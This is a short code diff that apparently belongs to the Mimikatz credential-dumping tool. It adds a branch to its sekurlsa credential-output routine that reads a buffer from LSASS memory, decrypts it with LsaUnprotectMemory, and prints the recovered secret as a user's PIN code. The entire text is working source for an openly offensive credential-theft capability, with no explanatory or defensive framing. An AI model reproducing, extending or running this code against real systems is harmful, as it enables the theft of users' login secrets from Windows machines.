@@ -450,6 +450,19 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 				}
 			}
 		}
+		else if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_PINCODE)
+		{
+			if(mesCreds->UserName.Buffer)
+			{
+				if(kull_m_string_getUnicodeString(&mesCreds->UserName, cLsass.hLsassMem))
+				{
+					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
+						(*lsassLocalHelper->pLsaUnprotectMemory)(mesCreds->UserName.Buffer, mesCreds->UserName.MaximumLength);
+					kprintf(L"\n\t * PIN code : %wZ", &mesCreds->UserName);
+					LocalFree(mesCreds->UserName.Buffer);
+				}
+			}
+		}
 		else
 		{
 			if(mesCreds->UserName.Buffer || mesCreds->Domaine.Buffer || mesCreds->Password.Buffer)
